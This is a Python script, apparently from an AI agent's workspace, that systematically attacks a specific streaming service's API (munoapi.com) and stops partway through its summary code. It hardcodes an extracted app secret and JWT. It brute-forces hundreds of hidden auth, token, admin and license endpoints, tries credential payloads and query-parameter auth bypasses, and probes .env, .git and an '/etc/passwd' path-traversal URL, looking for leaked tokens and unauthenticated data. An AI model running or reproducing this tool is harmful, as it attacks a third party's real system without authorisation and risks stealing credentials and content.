#!/usr/bin/env python3
"""
Munowatch API Comprehensive Hidden Endpoint Probe
==================================================
Systematically probes https://munoapi.com/api/ for:
  - Hidden authentication endpoints (login, register, token generation)
  - Alternative authentication methods (API keys, basic auth, headers)
  - Unauthenticated data endpoints (dashboard variants, content endpoints)
  - Undocumented/hidden endpoints
  - Query parameter auth bypass attempts

Tests each endpoint with multiple auth variations:
  - No auth (bare GET)
  - X-API-Key header with appsecret
  - Authorization Bearer with appsecret
  - X-App-Secret header with appsecret
  - POST with JSON credentials
  - URL query params (?key=, ?api_key=, ?token=, ?secret=)

Saves complete results to /home/z/my-project/api_probe_results.json
"""

import json
import time
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════

BASE_URL = "https://munoapi.com/api"
APPSECRET = "022778e418ad68ffda9aa4fab1892fff"
USER_ID = "82717"
USER_AGENT = "Android IOS v3.0"

ORIGINAL_TOKEN = (
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJ1c2VybmFtZSI6IkFuZHJvaWQgVFYiLCJhcHBuYW1lIjoiTXVub3dhdGNoIFRWIiwiaG9zdCI6"
    "Im11bm93YXRjaC5jbyIsImFwcHNlY3JldCI6IjAyMjc3OGU0MThhZDY4ZmZkYTlhYTRmYWIxODky"
    "ZmZmIiwiYWN0aXZhdGVkIjoiMSIsImV4cCI6MTcwNzM2ODQwMH0.unlPnEzptg6VFHs7WWm213bR"
    "HHNxYuAN2eZQvjtPKL0"
)

OUTPUT_FILE = "/home/z/my-project/api_probe_results.json"

# ═══════════════════════════════════════════════════════════════
# ENDPOINT DEFINITIONS
# ═══════════════════════════════════════════════════════════════

# Category 1: Auth endpoints — login, register, signup, signin, auth, authenticate
AUTH_ENDPOINTS = [
    "login", "register", "signup", "signin", "auth", "authenticate",
    "auth/login", "auth/register", "auth/signup", "auth/signin", "auth/authenticate",
    "user/login", "user/register", "user/signup", "user/signin", "user/auth",
    "api/login", "api/register", "api/auth",
    "account/login", "account/auth",
    "member/login", "member/auth",
    "v1/login", "v2/login", "v1/auth", "v2/auth", "v3/auth",
    "munowatch/login", "munowatch/auth", "muno/login", "muno/auth",
    "tv/login", "tv/auth", "android/login", "android/auth",
    "sign-in", "log-in", "log_in", "sign_up", "sign-up",
]

# Category 2: Token/key endpoints — token, refresh, generate-token, new-token, api-key, generate-key
TOKEN_ENDPOINTS = [
    "token", "refresh", "refresh-token", "generate-token", "new-token", "api-key", "generate-key",
    "auth/token", "auth/refresh", "auth/refresh-token", "auth/generate-token",
    "token/generate", "token/create", "token/new", "token/refresh", "token/renew", "token/issue",
    "token/verify", "token/validate", "token/check",
    "refresh/token", "refresh_token", "renew/token",
    "api/token", "api/key", "api/generate", "api/keys",
    "apikey", "apikeys", "api_keys", "api-key", "api-keys",
    "key/generate", "key/create", "key/new", "keys", "get-key", "get_key",
    "generate/key", "generate/apikey", "generate_token", "create_token",
    "jwt", "auth/jwt", "api/jwt",
    "access-token", "access_token",
    "session", "session/new", "session/create",
    "oauth", "oauth/token", "oauth2/token",
    "client/token", "client_credential",
    "credential", "credentials",
]

# Category 3: User endpoints — user, users, profile, account, me
USER_ENDPOINTS = [
    "user", "users", "profile", "account", "me",
    "user/me", "user/profile", "user/info", "user/details", "user/data",
    "users/me", "users/profile", "users/info",
    "account/me", "account/profile", "account/info", "account/details",
    "profile/info", "profile/me",
    "myself", "self", "whoami", "identity",
    "member", "member/me", "member/info", "member/profile",
    "admin", "admin/login", "admin/user", "admin/users", "admin/dashboard",
    "staff", "moderator",
]

# Category 4: System/info endpoints — dashboard-data, stats, config, settings, info, status, health, ping, version
SYSTEM_ENDPOINTS = [
    "dashboard-data", "stats", "config", "settings", "info", "status", "health", "ping", "version",
    "dashboard", "dashboard-data", "dashboard/info", "dashboard/stats",
    "system/info", "system/status", "system/config", "system/health",
    "api/info", "api/status", "api/config", "api/version",
    "server/info", "server/status",
    "app/info", "app/config", "app/status", "app/version",
    "meta", "metadata", "about",
    "uptime", "ready", "live", "check", "test",
    "environment", "env", "debug",
    "docs", "doc", "documentation", "swagger", "openapi", "api-docs",
    "schema", "graphql", "playground",
    "robots.txt", "sitemap.xml", ".well-known", "favicon.ico",
    "help", "support", "contact",
    "changelog", "release", "updates",
]

# Category 5: Content browsing — categories, genre, genres, tags, popular, trending, latest, new, recent, top
CONTENT_ENDPOINTS = [
    "categories", "category", "genre", "genres", "tags", "popular", "trending", "latest", "new", "recent", "top",
    "browse", "explore", "discover", "featured", "recommend", "recommended",
    "movies", "series", "episodes", "videos", "video", "media",
    "shows", "shows-all", "shows/all", "all", "home",
    "trending/movies", "trending/series", "trending/shows",
    "popular/movies", "popular/series", "popular/shows",
    "latest/movies", "latest/series", "latest/shows",
    "top/movies", "top/series", "top/shows",
    "new/movies", "new/series", "new/shows",
    "recent/movies", "recent/series", "recent/shows",
    "categories/movies", "categories/series",
    "genre/action", "genre/drama", "genre/comedy", "genre/horror", "genre/sci-fi",
    "list", "lists",
    "search", "query", "find",
    "random", "surprise", "pick",
    "calendar", "schedule", "upcoming",
    "ratings", "reviews",
    "collections", "playlist", "playlists",
    "favorites", "favourites", "watchlist", "history", "continue",
]

# Category 6: Media action endpoints — download, stream, play, embed, source, link, resolve
MEDIA_ENDPOINTS = [
    "download", "stream", "play", "embed", "source", "link", "resolve",
    "download/url", "stream/url", "play/url",
    "media/url", "video/url", "movie/url",
    "resolve/url", "resolve/link", "resolve/source",
    "embed/player", "player", "player/embed",
    "m3u8", "hls", "mpd", "dash",
    "subtitle", "subtitles", "caption",
    "thumbnail", "thumbnails", "images", "poster",
]

# Category 7: Known endpoints with different auth
KNOWN_ENDPOINTS = [
    "search", "browse", "list", "shows", "preview", "dashboard",
    "dashboard/v2", "dashboard/v2/82717",
    "preview/63003", "preview/63003/82717", "preview/v2/63003/82717",
    "search/Avengers/82717/0",
    "browse/tabs", "browse/all", "browse/movies", "browse/series",
    "list/5/0/82717/0", "shows/5/0/82717/0",
    "episodes/range/63003/action/1",
]

# Category 8: License/activation endpoints
LICENSE_ENDPOINTS = [
    "key", "license", "activate", "device", "subscribe",
    "key/activate", "key/verify", "key/validate", "key/check",
    "license/activate", "license/verify", "license/validate",
    "license/key", "license/new", "license/generate",
    "activate/device", "activate/app", "activate/license",
    "device/register", "device/activate", "device/auth", "device/verify",
    "subscribe", "subscription", "subscription/activate", "subscription/check",
    "plan", "plans", "pricing",
    "trial", "premium", "vip",
    "otp", "otp/verify", "otp/send", "verify/otp",
    "2fa", "two-factor",
]

# Category 9: Additional hidden/guessed endpoints
HIDDEN_ENDPOINTS = [
    "",  # root
    "api",  # double api
    "v1", "v2", "v3", "v4", "v5",
    "v1/api", "v2/api",
    "public", "public/api", "open", "free", "guest",
    "external", "webhook", "callback",
    "cron", "worker", "job", "queue",
    "log", "logs", "error", "errors",
    "backup", "export", "import", "sync",
    "notification", "notifications", "push", "email",
    "payment", "pay", "checkout", "billing",
    "report", "analytics", "tracking", "pixel",
    "cdn", "cache", "image", "upload",
    "cronjob", "maintenance", "deploy",
    "internal", "private", "protected", "secure",
    "test", "testing", "debug", "dev", "development", "staging",
    "phpinfo", "info.php", "php-my-admin", "adminer",
    "wp-login", "xmlrpc", "wp-admin",
    "env", ".env", ".git", "config.php", "settings.php",
    "api/v1", "api/v2", "api/v3",
    "rest", "rest/v1", "rpc",
    "json", "xml", "csv",
    "feed", "rss", "atom",
    "socket", "ws", "websocket",
    "graphql", "gql",
    "playground", "sandbox",
    "console", "terminal",
    "munowatch", "muno", "tv",
    "app", "apps", "application",
    "client", "clients", "partner", "partners",
    "developer", "developers", "devportal", "dev-portal",
    "sdk", "integration",
    "webhook", "webhooks", "hook", "hooks",
    "rate-limit", "quota", "usage", "limits",
    "flag", "flags", "feature", "features",
    "ab", "experiment", "experiments",
]

# Category 10: Endpoints to test with query parameter auth
QUERY_PARAM_ENDPOINTS = [
    "dashboard", "search", "browse", "list", "shows", "preview",
    "dashboard/82717", "search/Avengers", "preview/63003",
    "categories", "popular", "trending", "latest", "movies",
    "user", "profile", "me", "account",
    "config", "info", "status",
]

# All endpoints combined
ALL_ENDPOINTS = list(dict.fromkeys(
    AUTH_ENDPOINTS + TOKEN_ENDPOINTS + USER_ENDPOINTS + SYSTEM_ENDPOINTS +
    CONTENT_ENDPOINTS + MEDIA_ENDPOINTS + KNOWN_ENDPOINTS +
    LICENSE_ENDPOINTS + HIDDEN_ENDPOINTS
))

# ═══════════════════════════════════════════════════════════════
# AUTH VARIATIONS
# ═══════════════════════════════════════════════════════════════

def make_base_headers():
    return {
        "Accept": "application/json",
        "User-Agent": USER_AGENT,
        "Accept-Encoding": "gzip, deflate, br",
    }

AUTH_VARIATIONS = {
    "no_auth": lambda ep: (f"{BASE_URL}/{ep}", make_base_headers(), None),
    "x_api_key_secret": lambda ep: (f"{BASE_URL}/{ep}", {**make_base_headers(), "X-API-Key": APPSECRET}, None),
    "bearer_secret": lambda ep: (f"{BASE_URL}/{ep}", {**make_base_headers(), "Authorization": f"Bearer {APPSECRET}"}, None),
    "x_app_secret": lambda ep: (f"{BASE_URL}/{ep}", {**make_base_headers(), "X-App-Secret": APPSECRET}, None),
    "x_api_key_token": lambda ep: (f"{BASE_URL}/{ep}", {**make_base_headers(), "X-API-Key": ORIGINAL_TOKEN, "Authorization": f"Bearer {ORIGINAL_TOKEN}"}, None),
}

QUERY_PARAM_AUTHS = [
    ("?key=", APPSECRET),
    ("?api_key=", APPSECRET),
    ("?token=", APPSECRET),
    ("?secret=", APPSECRET),
    ("?appsecret=", APPSECRET),
    ("?apikey=", APPSECRET),
    ("?access_key=", APPSECRET),
    ("?auth_token=", APPSECRET),
    ("?X-API-Key=", APPSECRET),
]

# POST payloads
POST_PAYLOADS = [
    {"username": "Android TV", "password": APPSECRET},
    {"appname": "Munowatch TV", "appsecret": APPSECRET},
    {"host": "munowatch.co", "appsecret": APPSECRET},
    {"user_id": USER_ID, "appsecret": APPSECRET},
    {"username": "Android TV", "appname": "Munowatch TV", "appsecret": APPSECRET},
    {"appname": "Munowatch TV", "host": "munowatch.co", "appsecret": APPSECRET},
    {"username": "Android TV", "appname": "Munowatch TV", "host": "munowatch.co", "appsecret": APPSECRET},
    {"email": "hamcodz@munowatch.co", "password": APPSECRET},
    {"username": "82717", "password": APPSECRET},
    {"user_id": "82717", "host": "munowatch.co", "appsecret": APPSECRET},
    {"key": APPSECRET, "host": "munowatch.co"},
    {"api_key": APPSECRET},
    {"grant_type": "client_credentials", "client_secret": APPSECRET, "client_id": "munowatch"},
    {"secret": APPSECRET},
]

# ═══════════════════════════════════════════════════════════════
# PROBE ENGINE
# ═══════════════════════════════════════════════════════════════

results = []
total_tested = 0
hits_200 = 0
hits_interesting = 0

def safe_probe(url, method="GET", headers=None, data=None, timeout=8):
    """Make a request and return structured result."""
    try:
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=timeout, allow_redirects=False)
        elif method == "POST":
            r = requests.post(url, headers=headers, json=data, timeout=timeout, allow_redirects=False)
        elif method == "HEAD":
            r = requests.head(url, headers=headers, timeout=timeout, allow_redirects=False)
        elif method == "OPTIONS":
            r = requests.options(url, headers=headers, timeout=timeout, allow_redirects=False)
        else:
            r = requests.request(method, url, headers=headers, timeout=timeout, allow_redirects=False)

        body_text = r.text[:500]
        content_type = r.headers.get("content-type", "")
        body_json = None
        try:
            body_json = r.json()
        except:
            pass

        return {
            "status_code": r.status_code,
            "content_type": content_type,
            "body_json": body_json,
            "body_text": body_text,
            "response_headers": dict(r.headers),
            "redirect_location": r.headers.get("location", ""),
        }
    except requests.exceptions.Timeout:
        return {"status_code": 0, "error": "TIMEOUT"}
    except requests.exceptions.ConnectionError:
        return {"status_code": 0, "error": "CONNECTION_ERROR"}
    except Exception as e:
        return {"status_code": 0, "error": str(e)[:100]}

def probe_endpoint(endpoint, method="GET", headers=None, data=None, label="", category="", timeout=8):
    """Probe a single endpoint and record the result."""
    global total_tested, hits_200, hits_interesting

    url = f"{BASE_URL}/{endpoint}" if endpoint else BASE_URL
    total_tested += 1

    result = safe_probe(url, method, headers, data, timeout)
    status = result.get("status_code", 0)

    entry = {
        "endpoint": endpoint,
        "url": url,
        "method": method,
        "label": label,
        "category": category,
        "status_code": status,
        "content_type": result.get("content_type", ""),
        "body_json": result.get("body_json"),
        "body_text_preview": result.get("body_text", "")[:500],
        "response_headers": result.get("response_headers", {}),
        "redirect_location": result.get("redirect_location", ""),
        "timestamp": datetime.utcnow().isoformat() + "Z",
    }

    if data:
        entry["request_data"] = data
    if headers:
        # Only store custom headers (not default)
        custom = {k: v for k, v in headers.items() if k not in ("Accept", "User-Agent", "Accept-Encoding")}
        if custom:
            entry["custom_headers"] = custom

    results.append(entry)

    return entry

def is_interesting(entry):
    """Check if a result is worth flagging."""
    status = entry.get("status_code", 0)
    body_json = entry.get("body_json")
    body_text = entry.get("body_text_preview", "")

    if status == 200:
        return True
    if status in (201, 202, 204):
        return True
    if status in (301, 302, 303, 307, 308):
        return True
    if status == 401 and body_json:
        return True
    if status == 403 and body_json:
        return True
    if status == 405:
        return True
    if status >= 500:
        # Server errors can leak info
        if body_json and isinstance(body_json, dict):
            exc = body_json.get("exception", [])
            if isinstance(exc, list) and len(exc) > 0:
                return True
        return True
    if status == 422:
        return True  # Validation errors reveal accepted fields
    if status == 400 and body_json:
        return True
    return False

def has_useful_data(entry):
    """Check if response contains actually useful data (tokens, keys, content)."""
    body_json = entry.get("body_json")
    body_text = entry.get("body_text_preview", "").lower()

    if body_json and isinstance(body_json, dict):
        jstr = json.dumps(body_json).lower()
        # Token/key related
        if any(w in jstr for w in ("token", "api_key", "apikey", "jwt", "eyj", "bearer", "access_key", "secret")):
            return True, "TOKEN/KEY RELATED"
        # Content data
        content_keys = ("dashboard", "banner", "search", "results", "preview", "data",
                       "movies", "videos", "shows", "list", "categories", "user", "profile")
        if any(k in body_json for k in content_keys):
            return True, f"DATA: {list(body_json.keys())[:6]}"
        # Success messages
        if any(w in jstr for w in ("success", "ok", "created", "activated", "valid")):
            return True, "SUCCESS RESPONSE"
        # Any non-empty response that's not an error
        if not any(k in body_json for k in ("400", "401", "403", "404", "500", "error", "exception")):
            if len(body_json) > 0:
                return True, f"RESPONSE KEYS: {list(body_json.keys())[:6]}"

    if body_text and status_check(entry) == 200:
        if "eyj" in body_text:
            return True, "JWT TOKEN IN TEXT"
        if any(w in body_text for w in ("token", "api.key", "login form", "auth")):
            return True, "AUTH RELATED HTML"

    return False, ""

def status_check(entry):
    return entry.get("status_code", 0)

# ═══════════════════════════════════════════════════════════════
# MAIN PROBE EXECUTION
# ═══════════════════════════════════════════════════════════════

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
BOLD = "\033[1m"
DIM = "\033[90m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"
RED_BG = "\033[41m"
GREEN_BG = "\033[42m"
YELLOW_BG = "\033[43m"

print(f"\n{BOLD}{CYAN}{'='*80}{RESET}")
print(f"{BOLD}{CYAN}  MUNOWATCH API COMPREHENSIVE HIDDEN ENDPOINT PROBE{RESET}")
print(f"{BOLD}{CYAN}  Target: {BASE_URL}{RESET}")
print(f"{BOLD}{CYAN}  Started: {datetime.utcnow().isoformat()}Z{RESET}")
print(f"{BOLD}{CYAN}{'='*80}{RESET}")

# ─── PHASE 1: Quick GET sweep on ALL endpoints (no auth) ─────
print(f"\n{BOLD}PHASE 1: GET sweep on {len(ALL_ENDPOINTS)} endpoints (no auth){RESET}")
print(f"{DIM}{'─'*70}{RESET}\n")

phase1_hits = []
for ep in ALL_ENDPOINTS:
    entry = probe_endpoint(ep, method="GET", label="GET no-auth", category="sweep")
    status = entry.get("status_code", 0)

    if status not in (0, 404):
        useful, reason = has_useful_data(entry)
        if status == 200 or useful:
            hits_200 += 1
            phase1_hits.append(entry)
            icon = f"{RED_BG}{BOLD}HIT{RESET}" if useful else f"{GREEN}OK{RESET}"
            detail = reason or f"HTTP {status}"
            body_json = entry.get("body_json")
            snippet = ""
            if body_json and isinstance(body_json, dict):
                snippet = json.dumps(body_json)[:150]
            elif entry.get("body_text_preview"):
                snippet = entry["body_text_preview"][:80]
            print(f"  {icon} GET /{ep:<40} → {status}  {detail}")
            if snippet:
                print(f"      {DIM}{snippet}{RESET}")
        elif status in (401, 403, 405, 500):
            hits_interesting += 1
            body_json = entry.get("body_json")
            detail = ""
            if body_json and isinstance(body_json, dict):
                detail = json.dumps(body_json)[:100]
            print(f"  {YELLOW}*{RESET}  GET /{ep:<40} → {status}  {detail}")

    time.sleep(0.08)

# ─── PHASE 2: Auth header variations on ALL endpoints ───────
print(f"\n{BOLD}PHASE 2: Auth header variations on all non-404 endpoints{RESET}")
print(f"{DIM}{'─'*70}{RESET}\n")

# Collect endpoints that responded with anything other than 404 or 0
live_endpoints = [r["endpoint"] for r in results if r["status_code"] not in (0, 404)]
live_endpoints = list(dict.fromkeys(live_endpoints))  # dedupe

phase2_hits = []
for ep in live_endpoints:
    for auth_name, auth_fn in AUTH_VARIATIONS.items():
        if auth_name == "no_auth":
            continue  # Already tested
        url, headers, data = auth_fn(ep)
        entry = probe_endpoint(ep, method="GET", headers=headers, label=f"GET {auth_name}", category="auth_variation")
        status = entry.get("status_code", 0)

        if status == 200:
            useful, reason = has_useful_data(entry)
            if useful:
                phase2_hits.append(entry)
                print(f"  {RED_BG}{BOLD}HIT{RESET} {auth_name:<22} /{ep:<35} → 200  {reason}")
                body_json = entry.get("body_json")
                if body_json:
                    print(f"      {DIM}{json.dumps(body_json)[:150]}{RESET}")
        time.sleep(0.06)

# ─── PHASE 3: POST with credential payloads on auth endpoints ─
print(f"\n{BOLD}PHASE 3: POST credential payloads on {len(AUTH_ENDPOINTS + TOKEN_ENDPOINTS + LICENSE_ENDPOINTS)} auth/key endpoints{RESET}")
print(f"{DIM}{'─'*70}{RESET}\n")

auth_post_endpoints = AUTH_ENDPOINTS + TOKEN_ENDPOINTS + LICENSE_ENDPOINTS
phase3_hits = []

for ep in auth_post_endpoints:
    for payload in POST_PAYLOADS:
        pk = list(payload.keys())[0]
        entry = probe_endpoint(ep, method="POST", data=payload,
                             label=f"POST {pk}", category="auth_payload")
        status = entry.get("status_code", 0)

        if status in (200, 201):
            useful, reason = has_useful_data(entry)
            if useful:
                phase3_hits.append(entry)
                body_json = entry.get("body_json")
                snippet = json.dumps(body_json)[:150] if body_json else entry.get("body_text_preview", "")[:100]
                print(f"  {RED_BG}{BOLD}HIT{RESET} POST /{ep:<30} ({pk}) → {status}  {reason}")
                print(f"      {DIM}{snippet}{RESET}")
        elif status == 422:
            # Validation error — endpoint exists and tells us what it expects
            body_json = entry.get("body_json")
            if body_json and isinstance(body_json, dict):
                phase3_hits.append(entry)
                print(f"  {YELLOW}422{RESET} POST /{ep:<30} ({pk}) → {json.dumps(body_json)[:120]}")
        time.sleep(0.06)

# ─── PHASE 4: Query parameter auth on select endpoints ───────
print(f"\n{BOLD}PHASE 4: Query parameter auth on {len(QUERY_PARAM_ENDPOINTS)} endpoints{RESET}")
print(f"{DIM}{'─'*70}{RESET}\n")

phase4_hits = []
for ep in QUERY_PARAM_ENDPOINTS:
    for param_name, param_value in QUERY_PARAM_AUTHS:
        url = f"{BASE_URL}/{ep}{param_name}{param_value}"
        entry = probe_endpoint(ep, method="GET", label=f"GET {param_name}={param_value[:12]}...",
                             category="query_param_auth")
        # Override the URL to include the query param
        entry["url"] = url
        results[-1] = entry  # update the stored entry

        status = entry.get("status_code", 0)
        if status == 200:
            useful, reason = has_useful_data(entry)
            if useful:
                phase4_hits.append(entry)
                body_json = entry.get("body_json")
                snippet = json.dumps(body_json)[:150] if body_json else ""
                print(f"  {RED_BG}{BOLD}HIT{RESET} {param_name:<15} /{ep:<30} → 200  {reason}")
                if snippet:
                    print(f"      {DIM}{snippet}{RESET}")
        time.sleep(0.06)

# ─── PHASE 5: OPTIONS preflight on interesting endpoints ─────
print(f"\n{BOLD}PHASE 5: OPTIONS/HEAD on interesting endpoints{RESET}")
print(f"{DIM}{'─'*70}{RESET}\n")

phase5_hits = []
interesting_eps = list(dict.fromkeys(
    AUTH_ENDPOINTS[:15] + TOKEN_ENDPOINTS[:15] + SYSTEM_ENDPOINTS[:10] +
    ["dashboard", "search", "preview", "browse", "list", "shows", ""]
))

for ep in interesting_eps:
    # OPTIONS
    entry = probe_endpoint(ep, method="OPTIONS", label="OPTIONS", category="preflight")
    status = entry.get("status_code", 0)
    allow = entry.get("response_headers", {}).get("allow", "")
    if status in (200, 204) and allow:
        phase5_hits.append(entry)
        print(f"  {GREEN}OPTIONS{RESET} /{ep:<40} → {status}  Allow: {allow}")

    # HEAD
    entry = probe_endpoint(ep, method="HEAD", label="HEAD", category="preflight")
    status = entry.get("status_code", 0)
    if status not in (0, 404):
        server = entry.get("response_headers", {}).get("server", "")
        powered = entry.get("response_headers", {}).get("x-powered-by", "")
        if status != 404:
            print(f"  {DIM}HEAD{RESET}    /{ep:<40} → {status}  Server: {server}  X-Powered-By: {powered}")

    time.sleep(0.05)

# ─── PHASE 6: Versioned endpoint variations ─────────────────
print(f"\n{BOLD}PHASE 6: Versioned endpoint variations{RESET}")
print(f"{DIM}{'─'*70}{RESET}\n")

phase6_hits = []
version_prefixes = ["v1/", "v2/", "v3/", "v4/", "api/v1/", "api/v2/"]
base_eps = ["dashboard", "dashboard/82717", "search", "auth", "token",
            "login", "register", "user", "categories", "browse", "list", "preview"]

for prefix in version_prefixes:
    for ep in base_eps:
        full_ep = f"{prefix}{ep}"
        entry = probe_endpoint(full_ep, method="GET", label=f"GET versioned", category="versioned")
        status = entry.get("status_code", 0)

        if status == 200:
            useful, reason = has_useful_data(entry)
            if useful:
                phase6_hits.append(entry)
                body_json = entry.get("body_json")
                print(f"  {GREEN}OK{RESET} GET /{full_ep:<40} → 200  {reason}")
                if body_json:
                    print(f"      {DIM}{json.dumps(body_json)[:120]}{RESET}")
        elif status in (401, 403):
            print(f"  {YELLOW}*{RESET}  GET /{full_ep:<40} → {status}")
        time.sleep(0.05)

# ─── PHASE 7: Known endpoints with original JWT token ────────
print(f"\n{BOLD}PHASE 7: Known endpoints with original JWT token{RESET}")
print(f"{DIM}{'─'*70}{RESET}\n")

phase7_hits = []
auth_headers = {
    **make_base_headers(),
    "X-API-Key": ORIGINAL_TOKEN,
    "Authorization": f"Bearer {ORIGINAL_TOKEN}",
}

for ep in KNOWN_ENDPOINTS:
    entry = probe_endpoint(ep, method="GET", headers=auth_headers,
                         label="GET with JWT", category="known_with_token")
    status = entry.get("status_code", 0)

    if status == 200:
        useful, reason = has_useful_data(entry)
        phase7_hits.append(entry)
        print(f"  {GREEN}OK{RESET} GET /{ep:<45} → 200  {reason}")
        body_json = entry.get("body_json")
        if body_json and isinstance(body_json, dict):
            keys = list(body_json.keys())[:6]
            print(f"      {DIM}keys: {keys}{RESET}")
    elif status in (400, 401):
        body_json = entry.get("body_json")
        detail = json.dumps(body_json)[:80] if body_json else ""
        print(f"  {RED}FAIL{RESET} GET /{ep:<45} → {status}  {detail}")
    time.sleep(0.08)

# ─── PHASE 8: Test known endpoints WITHOUT any auth ──────────
print(f"\n{BOLD}PHASE 8: Known endpoints WITHOUT auth (data leak check){RESET}")
print(f"{DIM}{'─'*70}{RESET}\n")

phase8_hits = []
for ep in KNOWN_ENDPOINTS:
    entry = probe_endpoint(ep, method="GET", label="GET no-auth", category="known_no_auth")
    status = entry.get("status_code", 0)

    if status == 200:
        useful, reason = has_useful_data(entry)
        if useful:
            phase8_hits.append(entry)
            print(f"  {RED_BG}{BOLD}UNAUTH LEAK{RESET} GET /{ep:<40} → 200  {reason}")
            body_json = entry.get("body_json")
            if body_json:
                print(f"      {DIM}{json.dumps(body_json)[:150]}{RESET}")
    time.sleep(0.06)

# ─── PHASE 9: Alternative base URLs and path tricks ──────────
print(f"\n{BOLD}PHASE 9: Alternative URLs and path tricks{RESET}")
print(f"{DIM}{'─'*70}{RESET}\n")

phase9_hits = []
alt_urls = [
    "https://munoapi.com/api/",
    "https://munoapi.com/api//",
    "https://munoapi.com/api/./",
    "https://munoapi.com/api/%2e/",
    "https://munoapi.com//api/dashboard",
    "https://munoapi.com/api/dashboard.json",
    "https://munoapi.com/api/dashboard/",
    "https://munoapi.com/api/v1",
    "https://munoapi.com/api/v2",
    "https://munoapi.com/api/v3",
    "https://munoapi.com/api/index.php",
    "https://munoapi.com/api/index.php/dashboard",
    "https://munoapi.com/api/index.php?q=dashboard",
    "https://munoapi.com/api/?route=dashboard",
    "https://munoapi.com/api/?action=dashboard",
    "https://munoapi.com/api/?endpoint=dashboard",
    "https://munoapi.com/api/?_method=GET",
    "https://munoapi.com/api/?format=json",
    "https://munoapi.com/api/?callback=test",
    "https://munoapi.com/api/..%2f..%2fetc%2fpasswd",
    "https://munoapi.com",
    "https://munowatch.co/api",
    "https://munowatch.co/api/dashboard",
    "https://munowatch.co/api/v1",
    "https://api.munowatch.co",
    "https://api.munowatch.co/api",
    "https://api.munowatch.co/api/dashboard",
    "https://hamcodz.duckdns.org/api",
]

for url in alt_urls:
    try:
        r = requests.get(url, headers=make_base_headers(), timeout=8, allow_redirects=False)
        body_text = r.text[:500]
        body_json = None
        try:
            body_json = r.json()
        except:
            pass

        entry = {
            "endpoint": url,
            "url": url,
            "method": "GET",
            "label": "alt_url",
            "category": "alternative_url",
            "status_code": r.status_code,
            "content_type": r.headers.get("content-type", ""),
            "body_json": body_json,
            "body_text_preview": body_text,
            "response_headers": dict(r.headers),
            "redirect_location": r.headers.get("location", ""),
            "timestamp": datetime.utcnow().isoformat() + "Z",
        }
        results.append(entry)

        status = r.status_code
        if status in (200, 301, 302) or (status == 200 and body_json):
            phase9_hits.append(entry)
            detail = ""
            if body_json and isinstance(body_json, dict):
                detail = json.dumps(body_json)[:120]
            elif r.status_code in (301, 302, 307):
                detail = f"→ {r.headers.get('location', '?')}"
            else:
                detail = body_text[:80]
            print(f"  {GREEN}OK{RESET} {url:<60} → {status}  {detail}")
        elif status not in (0, 404):
            print(f"  {DIM}{status}{RESET} {url:<60}")
    except:
        pass
    time.sleep(0.08)

# ─── PHASE 10: Content-type and parameter tricks ────────────
print(f"\n{BOLD}PHASE 10: Content-type tricks and parameter fuzzing{RESET}")
print(f"{DIM}{'─'*70}{RESET}\n")

phase10_hits = []
tricky_requests = [
    # JSONP callback
    ("dashboard", {"callback": "jQuery.12345"}, "GET"),
    ("dashboard/82717", {"callback": "test"}, "GET"),
    # Format override
    ("dashboard", {"format": "json"}, "GET"),
    ("dashboard", {"_format": "json"}, "GET"),
    ("dashboard", {"output": "json"}, "GET"),
    ("dashboard", {"type": "json"}, "GET"),
    # Pretty print
    ("dashboard", {"pretty": "1"}, "GET"),
    ("dashboard", {"pretty": "true"}, "GET"),
    # CORS headers
    ("dashboard", None, "OPTIONS"),
    ("login", None, "OPTIONS"),
    ("token", None, "OPTIONS"),
    # Content-type variations for POST
    ("login", {"username": "Android TV", "appsecret": APPSECRET}, "POST"),
    ("token", {"appsecret": APPSECRET}, "POST"),
    ("auth", {"appsecret": APPSECRET}, "POST"),
]

for ep, params, method in tricky_requests:
    url = f"{BASE_URL}/{ep}"
    headers = make_base_headers()

    if params:
        if method == "GET":
            url += "?" + "&".join(f"{k}={v}" for k, v in params.items())
            r = safe_probe(url, "GET", headers)
        else:
            r = safe_probe(url, "POST", headers, data=params)
    else:
        r = safe_probe(url, method, headers)

    entry = {
        "endpoint": ep,
        "url": url,
        "method": method,
        "label": "content_trick",
        "category": "tricks",
        "status_code": r.get("status_code", 0),
        "body_json": r.get("body_json"),
        "body_text_preview": r.get("body_text", ""),
        "timestamp": datetime.utcnow().isoformat() + "Z",
    }
    if params:
        entry["params"] = params
    results.append(entry)

    status = r.get("status_code", 0)
    if status == 200:
        useful, reason = has_useful_data(entry)
        if useful:
            phase10_hits.append(entry)
            body_json = r.get("body_json")
            snippet = json.dumps(body_json)[:150] if body_json else r.get("body_text", "")[:100]
            print(f"  {GREEN}OK{RESET} {method} /{ep:<40} → 200  {reason}")
            print(f"      {DIM}{snippet}{RESET}")
    time.sleep(0.06)

# ═══════════════════════════════════════════════════════════════
# SAVE RESULTS
# ═══════════════════════════════════════════════════════════════

print(f"\n{BOLD}{CYAN}{'='*80}{RESET}")
print(f"{BOLD}{CYAN}  SAVING RESULTS{RESET}")
print(f"{BOLD}{CYAN}{'='*80}{RESET}\n")

# Collect all interesting results for summary
all_interesting = [r for r in results if is_interesting(r)]
all_200 = [r for r in results if r.get("status_code") == 200]
all_useful = []
for r in results:
    useful, reason = has_useful_data(r)
    if useful:
        all_useful.append((r, reason))

# Build summary
summary = {
    "probe_info": {
        "target": BASE_URL,
        "started": datetime.utcnow().isoformat() + "Z",
        "total_requests": total_tested,
        "unique_endpoints_tested": len(ALL_ENDPOINTS) + len(alt_urls) + len(tricky_requests),
        "auth_endpoints_tested": len(AUTH_ENDPOINTS),
        "token_endpoints_tested": len(TOKEN_ENDPOINTS),
        "user_endpoints_tested": len(USER_ENDPOINTS),
        "system_endpoints_tested": len(SYSTEM_ENDPOINTS),
        "content_endpoints_tested": len(CONTENT_ENDPOINTS),
        "media_endpoints_tested": len(MEDIA_ENDPOINTS),
        "license_endpoints_tested": len(LICENSE_ENDPOINTS),
        "hidden_endpoints_tested": len(HIDDEN_ENDPOINTS),
    },
    "totals": {
        "total_requests_made": total_tested,
        "http_200_responses": len(all_200),
        "interesting_responses": len(all_interesting),
        "useful_data_responses": len(all_useful),
    },
    "status_code_distribution": {},
    "hits_200_with_data": [],
    "hits_interesting": [],
